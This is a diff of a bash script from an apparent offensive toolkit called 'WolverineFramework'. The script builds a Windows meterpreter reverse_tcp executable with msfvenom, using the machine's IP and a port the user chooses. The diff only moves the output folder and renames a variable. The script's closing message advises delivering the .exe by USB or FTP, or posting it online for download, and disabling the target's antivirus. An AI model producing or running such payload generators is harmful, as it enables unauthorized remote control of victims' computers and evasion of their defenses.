@@ -1,17 +1,18 @@
 #!/bin/bash
 
 lhost=$(hostname -I | awk '{print $1}')
-    mkdir exeFiles
-    dossier=$(pwd)
+    sudo mkdir ~/Wolverine_ExeFiles/
+    sudo mkdir ~/Wolverine_ExeFiles/EXE
+    #dossier=$(pwd)
     echo "Your IP address is :" $lhost
     echo "Which port do you want to use ?"
     read -p "WolverineFramework - Port> " lport
     echo "What name do you want to give to the .exe file ? (don't put .exe)"
-    read -p "WolverineFramework - File Name> " extension
+    read -p "WolverineFramework - File Name> " fileName
     echo "Creating .exe file..."
-    msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $extension.exe
-    mv $extension.exe exeFiles
-      echo "The .exe file is in this folder : " $dossier/exeFiles
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $fileName.exe
+    sudo mv $fileName.exe ~/Wolverine_ExeFiles/EXE
+      echo "The .exe file is in this folder : " ~/Wolverine_ExeFiles/EXE
     echo "Once it's done, I advise you to take the .exe file with an USB key or by FTP/SFTP, so you can put it on a Windows Computer, or put it on the Internet to  make it downloadable,
 but, the .exe file is very detectable, so don't forget to disable the antivurus present on the computer."
     echo ""
